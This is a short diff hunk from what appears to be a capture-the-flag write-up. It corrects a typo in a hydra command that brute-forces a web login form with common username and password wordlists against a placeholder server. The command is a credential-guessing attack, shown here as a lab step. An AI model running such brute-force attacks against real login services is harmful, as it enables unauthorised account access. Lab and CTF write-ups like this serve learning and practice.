@@ -21,7 +21,7 @@ Getting the flag:
 
 * {% code overflow="wrap" %}
   ```bash
-  hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f SERVER_IP -s SERVER_PORTORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
+  hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f SERVER_IP -s SERVER_PORT http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
   ```
   {% endcode %}
 
